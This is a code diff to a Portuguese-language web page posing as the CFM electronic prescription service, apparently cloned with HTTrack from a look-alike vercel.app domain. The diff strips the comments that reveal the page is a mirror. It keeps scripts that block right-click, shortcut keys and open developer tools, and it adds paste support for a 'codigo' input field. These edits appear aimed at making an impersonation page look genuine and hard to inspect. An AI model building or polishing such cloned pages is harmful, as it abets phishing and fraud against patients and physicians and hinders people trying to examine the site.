@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 
-<!-- Mirrored from prescricao-cfm-org.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Feb 2026 05:17:51 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
   <meta charset="UTF-8" />
   <title>Prescrição Eletrônica - CFM</title>
@@ -156,7 +154,7 @@
   cursor: pointer;
   font-weight: bold;
 
-  align-self: flex-start; /* 👈 força canto esquerdo */
+  align-self: flex-start;
 }
 
 
@@ -477,17 +475,16 @@ body {
     }, 3000);
   });
 
+  // ✅ Permitir colar (Ctrl+V e botão direito) no campo de código
+  const inputCodigo = document.getElementById("codigo");
+  inputCodigo.addEventListener("paste", function (e) {
+    // comportamento padrão de colar - sem bloqueio
+    e.stopPropagation();
+  });
 
-
-
-
-
-
-
-
-
-    // ❌ Bloquear botão direito do mouse
+  // ❌ Bloquear botão direito do mouse (exceto no input de código)
   document.addEventListener("contextmenu", function (e) {
+    if (e.target === inputCodigo) return true;
     e.preventDefault();
     return false;
   });
@@ -537,6 +534,12 @@ body {
       return false;
     }
 
+    // ✅ Ctrl + V (Colar) - PERMITIDO explicitamente
+    if (e.ctrlKey && e.key.toLowerCase() === "v") {
+      // deixa passar normalmente
+      return true;
+    }
+
   });
 
   // ❌ Tentativa extra para detectar DevTools aberto
@@ -550,8 +553,6 @@ body {
   }, 1000);
 </script>
 
-
 </body>
 
-<!-- Mirrored from prescricao-cfm-org.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Feb 2026 05:17:52 GMT -->
-</html>
+  </html>
